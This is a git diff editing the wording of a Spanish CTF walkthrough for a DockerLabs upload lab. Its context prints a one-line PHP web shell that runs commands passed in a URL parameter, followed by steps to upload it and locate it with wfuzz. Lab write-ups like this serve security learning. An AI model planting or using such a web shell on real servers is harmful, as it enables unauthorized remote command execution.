@@ -32,12 +32,12 @@ Visualizamos la pagina web.
 
 ![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-img1.png)
 
-Al tener la oportunidad de subir archivos a una web, en lo primero que pensariamos es en subir un archivo php con el que podamos ejecutar comandos atraves de un paramentro. Y es justo lo que haremos.
+Al tener la oportunidad de subir archivos a una web, en lo primero que pensariamos es en subir un archivo php con el que podamos ejecutar comandos dentro de la maquina atraves de un paramentro. Y es justo lo que haremos.
 ```shell
 echo "<?php system(\$_GET['cmd']); ?>" >> test.php
 ```
 
-Despues de crear el archivo lo subiremos al servidor. Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo.
+Despues de crear un el archivo lo subiremos al servidor. Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo.
 
 Para ello, haremos uso de wfuzz para encontrar esa ruta en donde ha sido guardado nuestro archivo.
 
